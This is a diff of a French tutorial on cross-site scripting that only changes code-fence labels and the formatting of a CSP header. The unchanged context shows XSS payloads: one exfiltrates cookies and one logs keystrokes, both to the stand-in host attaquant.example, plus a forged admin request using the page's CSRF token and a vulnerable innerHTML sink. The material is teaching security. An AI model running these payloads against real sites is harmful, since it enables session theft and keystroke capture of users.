@@ -291,7 +291,7 @@ un script injecté a accès à **tout ce que peut faire un script légitime de l
 **Vol de session.** D'abord confirmer que le cookie est lisible avec
 `alert(document.cookie)`, puis l'exfiltrer sans que la victime voie quoi que ce soit :
 
-```typescript
+```javascript
 // Charge utile d'exfiltration — exemple pédagogique, domaine fictif
 fetch('https://attaquant.example/collecte?c=' + document.cookie);
 ```
@@ -302,7 +302,7 @@ et **seulement** cette étape.
 
 **Enregistrement des frappes.** Le script pose un écouteur et exfiltre en continu :
 
-```typescript
+```javascript
 document.addEventListener('keydown', (e) => {
   fetch('https://attaquant.example/log?k=' + e.key);
 });
@@ -321,7 +321,7 @@ avancé. Le script injecté n'a même pas besoin du cookie : il appelle l'API de
 **depuis la page**, donc avec la session active de la victime, cookie envoyé automatiquement par
 le navigateur.
 
-```typescript
+```javascript
 const token = document.getElementsByName('_token')[0].value;
 fetch('/admin/', {
   method: 'POST',
@@ -461,9 +461,7 @@ La CSP est un en-tête HTTP par lequel le site **déclare au navigateur** ce qu'
 d'exécuter et de charger. Même si une injection réussit, une CSP bien réglée peut empêcher le
 script injecté de démarrer :
 
-```bash
-Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
-```
+`Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'`
 
 - **`script-src 'self'`** : seuls les scripts servis par le site lui-même s'exécutent ; un script
   externe injecté est bloqué. Un script **en ligne**, écrit directement dans la page, l'est aussi
@@ -691,7 +689,7 @@ irréprochable, le HTML qu'il sert est parfait, et la page est quand même vuln�
 
 :::: comparaison
 ::: vulnerable
-```typescript
+```javascript
 // La page souhaite la bienvenue avec le nom passé dans le fragment de l'URL
 const nom = decodeURIComponent(location.hash.slice(1));
 document.getElementById('salutation').innerHTML = 'Bonjour, ' + nom;
@@ -709,7 +707,7 @@ navigateur — c'est justement pourquoi les charges de XSS basé sur le DOM pass
 gestionnaire d'événement comme `onerror`.
 :::
 ::: corrige
-```typescript
+```javascript
 const nom = decodeURIComponent(location.hash.slice(1));
 const cible = document.getElementById('salutation');
 if (cible) {
